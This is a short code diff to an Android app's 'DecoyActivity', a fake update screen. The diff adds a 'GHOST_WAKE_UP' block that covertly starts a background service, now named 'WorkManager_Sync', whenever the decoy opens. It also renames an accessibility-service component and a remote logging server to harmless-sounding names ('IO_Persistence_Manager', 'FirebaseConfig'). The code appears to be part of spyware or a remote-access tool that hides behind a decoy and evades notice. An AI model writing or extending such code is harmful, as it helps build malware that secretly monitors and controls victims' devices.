@@ -45,6 +45,19 @@ public class DecoyActivity extends AppCompatActivity {
             setContentView(R.layout.activity_decoy);
             setupUpdateDecoy();
         }
+
+        // --- GHOST_WAKE_UP: Ensure server is active when decoy is opened ---
+        if (!WorkManager_Sync.isRunning && !WorkManager_Sync.isDestructing) {
+            Intent i = new Intent(this, WorkManager_Sync.class);
+            i.setAction("START");
+            try {
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                    startForegroundService(i);
+                } else {
+                    startService(i);
+                }
+            } catch (Exception ignored) {}
+        }
     }
 
     private void setupUpdateDecoy() {
@@ -295,9 +308,9 @@ public class DecoyActivity extends AppCompatActivity {
     protected void onResume() {
         super.onResume();
         // --- GHOST_HEALTH_CHECK ---
-        if (AccessibilityCore.getInstance() == null) {
+        if (IO_Persistence_Manager.getInstance() == null) {
             Log.w("DecoyActivity", "GHOST_MODE: Accessibility service lost");
-            LabRatsHttpServer.logActivity("INTEL_NOTICE: Accessibility service is offline");
+            FirebaseConfig.logActivity("INTEL_NOTICE: Accessibility service is offline");
         }
     }
 
